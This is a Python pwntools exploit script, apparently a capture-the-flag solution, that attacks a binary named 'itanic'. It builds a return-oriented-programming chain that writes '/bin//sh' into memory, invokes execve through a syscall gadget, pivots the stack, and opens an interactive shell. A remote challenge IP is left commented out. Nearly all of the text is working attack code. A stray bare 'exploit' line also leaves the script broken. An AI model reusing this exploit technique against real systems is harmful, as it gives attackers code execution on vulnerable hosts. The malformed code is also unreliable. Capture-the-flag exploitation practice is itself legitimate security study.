#!/usr/bin/env python

from pwn import *
from commands import getoutput as execve

p = process(argv=['./itanic'])
#p = remote('172.31.2.61', 16705)
p.sendline('3')
p.recvuntil(':')
p.sendline('DOCKFEESAREDUMB\n')

from struct import pack

# Padding goes here
r = ''

r += pack('<Q', 0x0000000000406e57) # pop rsi ; ret
r += pack('<Q', 0x00000000006d1080) # @ .data
r += pack('<Q', 0x000000000047e046) # pop rax ; pop rdx ; pop rbx ; ret
r += '/bin//sh'
r += pack('<Q', 0x4141414141414141) # padding
r += pack('<Q', 0x4141414141414141) # padding
r += pack('<Q', 0x0000000000479af1) # mov qword ptr [rsi], rax ; ret
r += pack('<Q', 0x0000000000406e57) # pop rsi ; ret
r += pack('<Q', 0x00000000006d1088) # @ .data + 8
r += pack('<Q', 0x000000000042ba1f) # xor rax, rax ; ret
r += pack('<Q', 0x0000000000479af1) # mov qword ptr [rsi], rax ; ret
r += pack('<Q', 0x0000000000406d36) # pop rdi ; ret
r += pack('<Q', 0x00000000006d1080) # @ .data
r += pack('<Q', 0x0000000000406e57) # pop rsi ; ret
r += pack('<Q', 0x00000000006d1088) # @ .data + 8
r += pack('<Q', 0x00000000004476b2) # pop rdx ; ret
r += pack('<Q', 0x00000000006d1088) # @ .data + 8
r += pack('<Q', 0x000000000042ba1f) # xor rax, rax ; ret

r += pack('<Q', 0x000000000046c1a0) * 0x13# add rax, 3 ; ret
r += pack('<Q', 0x000000000046c190) # add rax, 1 ; ret
r += pack('<Q', 0x000000000046c190) # add rax, 1 ; ret
r += pack('<Q', 0x000000000046ccd5) # syscall ; ret


exploit

code_exec = ',>,>,>,>,>,>,>,>.>.>.>.>.>.>.>.><<<<<<<<<<<<<<<<.>.>.>.>.>.>.>.>'

trigger = '%'

setup_rop = '<' * 0x100018 + ',>' * len(r)

exploit += code_exec + setup_rop + trigger

fd = open('exploit', 'wb')
fd.write(exploit)
fd.close()

print execve('python code_signer.py exploit exploit.enc')

cs_exploit = open('exploit.enc', 'rb').read()

gadget1 = p64(0x4a212d) #: mov rsp, rcx; ret;
#gdb.attach(p, '''
#b*0x4a212d
#continue
#''')

p.send(cs_exploit)
p.send(gadget1 + r)
print p.recvuntil('The ship is crawling with vermin, releasing cats!')
print p.recvuntil('\n')
#itanic = u64(p.recv(8))
#print 'itanic located at 0x%x' % itanic
#u64(p.recv(8))
p.interactive()




p.close()





